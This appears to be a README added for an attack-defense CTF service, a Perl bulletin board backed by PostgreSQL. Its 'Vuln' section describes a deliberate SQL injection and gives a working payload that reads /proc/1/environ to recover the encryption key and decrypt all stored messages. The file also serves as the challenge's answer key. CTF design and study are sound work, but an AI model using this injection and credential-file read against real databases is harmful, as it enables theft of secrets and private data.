@@ -1,0 +1,39 @@
+# BB bulletin board
+
+## Features
+
+1. register users by login/password
+2. login/logout
+3. create advertisements
+4. list all/own advertisements
+5. private communication with other users about advertisement
+6. only encrypted messages in database
+
+## Flags
+
+Flags are private messages in bb threads. They encrypts by `pgp_sym_encrypt` function from `pgcrypto` extension.
+
+## Vuln
+
+In `BB::Model::Boards->create_message()` input `$data` not filter, so we have an INSERT SQL injection.
+
+Next, we need get a decryption key, it stored in web app config (`b_b.conf`) and in ENV var `ENC_KEY` of `postgres` proccess. Web app config lie in `bb_web` container, so we can get key only via ENV. This can be done via `pg_read_binary_file('/proc/1/environ', 0, 1024)` because `bb` connect to databse with postgres user as a result of misconfiguration.
+
+Final message with sploit can look like this:
+
+```
+-' || (select string_agg(m, ',') from (select pgp_sym_decrypt(data, (select substring(encode(pg_read_binary_file('/proc/1/environ', 0, 1024), 'escape') from 'ENC_KEY=(\w+)'))) m from messages) x) || '-
+```
+
+## Soft
+
+1. PostgreSQL
+2. Perl + Mojolicious web framework
+
+## Deploy
+
+```bash
+$ docker-compose build --pull
+$ ./init.sh
+$ docker-compose up -d
+```
